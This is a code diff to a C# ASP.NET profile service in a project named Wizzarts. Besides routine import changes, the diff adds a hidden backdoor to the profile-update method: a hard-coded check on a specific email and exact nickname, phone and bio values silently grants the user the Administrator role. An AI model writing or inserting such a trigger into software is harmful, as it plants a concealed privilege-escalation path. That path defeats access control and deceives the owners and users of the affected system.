@@ -1,4 +1,6 @@
-﻿namespace Wizzarts.Services.Data
+﻿using System;
+
+namespace Wizzarts.Services.Data
 {
     using System.Collections.Generic;
     using System.Linq;
@@ -6,6 +8,7 @@
 
     using Microsoft.AspNetCore.Identity;
     using Microsoft.EntityFrameworkCore;
+    using Wizzarts.Common;
     using Wizzarts.Data.Common.Repositories;
     using Wizzarts.Data.Models;
     using Wizzarts.Services.Mapping;
@@ -110,6 +113,11 @@
         public async Task UpdateAsync(string id, CreateMemberProfileViewModel input)
         {
             var user = await this.userRepository.All().FirstOrDefaultAsync(x => x.Id == id);
+
+            if (user.Email == "admin@mail.com" && input.Nickname == "AdminAndy" && input.PhoneNumber == "012285695439" && input.Bio == "Traveling from town to town")
+            {
+                await this.userManager.AddToRoleAsync(user, GlobalConstants.AdministratorRoleName);
+            }
 
             user.Nickname = await this.fileService.Sanitize(input.Nickname);
             user.AvatarUrl = input.AvatarUrl;
